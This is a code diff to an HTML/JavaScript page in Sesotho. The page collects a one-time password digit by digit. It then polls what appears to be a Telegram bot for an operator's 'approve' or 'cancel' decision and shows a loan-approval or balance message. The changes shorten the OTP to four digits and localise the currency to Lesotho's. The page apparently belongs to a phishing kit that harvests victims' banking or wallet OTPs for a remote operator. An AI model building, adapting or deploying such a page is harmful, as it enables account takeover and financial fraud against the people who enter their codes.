@@ -140,7 +140,6 @@
             background: #f5f7fa;
             flex-shrink: 0;
             margin-top: auto;
-            /* Pushes footer to bottom */
         }
         /* SPINNER */
         
@@ -185,7 +184,7 @@
             max-width: 320px;
             font-weight: 500;
         }
-        /* SUCCESS / CANCEL MESSAGE */
+        /* RESULT OVERLAY */
         
         #resultOverlay {
             position: fixed;
@@ -225,12 +224,10 @@
 
         <div class="otp-label">OTP</div>
         <div class="otp-group">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
-            <input type="text" class="otp-box" maxlength="1">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
         </div>
 
         <div class="resend">Romela hape OTP kamora <span id="timer">116</span> metsotsoana</div>
@@ -279,6 +276,8 @@
         let lastUpdateId = 0;
         let currentCallbackData = '';
 
+        const OTP_LENGTH = 4;
+
         // Countdown timer
         const countdown = setInterval(() => {
             seconds--;
@@ -291,7 +290,7 @@
 
         function checkOtpComplete() {
             otpValue = Array.from(otpBoxes).map(box => box.value).join('');
-            if (otpValue.length === 6) {
+            if (otpValue.length === OTP_LENGTH) {
                 submitBtn.classList.add('enabled');
                 submitBtn.disabled = false;
             } else {
@@ -302,7 +301,10 @@
 
         otpBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
-                if (box.value.length === 1 && index < 5) {
+                // Keep only digits (basic)
+                box.value = box.value.replace(/\D/g, '');
+
+                if (box.value.length === 1 && index < otpBoxes.length - 1) {
                     otpBoxes[index + 1].focus();
                 }
                 checkOtpComplete();
@@ -316,7 +318,7 @@
         });
 
         submitBtn.addEventListener('click', () => {
-            if (otpValue.length !== 6) return;
+            if (otpValue.length !== OTP_LENGTH) return;
 
             spinnerOverlay.style.display = 'flex';
 
@@ -355,6 +357,7 @@
                         if (data.ok && data.result.length > 0) {
                             for (let update of data.result) {
                                 lastUpdateId = update.update_id;
+
                                 if (update.callback_query) {
                                     const dataParts = update.callback_query.data.split('_');
                                     if (dataParts[1] == timestamp) {
@@ -365,7 +368,6 @@
                                         if (dataParts[0] === 'approve') {
                                             resultMessage.textContent = 'Kopo ea hau ea mokitlane e se e amohetsoe. U tla fumana molaetsa oa netefatso nakong ea metsotso e 15. Kea leboha.';
                                         } else if (dataParts[0] === 'cancel') {
-                                            // Currency updated to Lesotho currency: Loti (LSL)
                                             resultMessage.textContent = 'Ka kopo leka hape u netefatse hore tlhahisoleseding ea hao e nepahetse le hore bonyane ba Main USD Balance bo lekana le LSL 30. Kea leboha.';
                                         }
                                     }
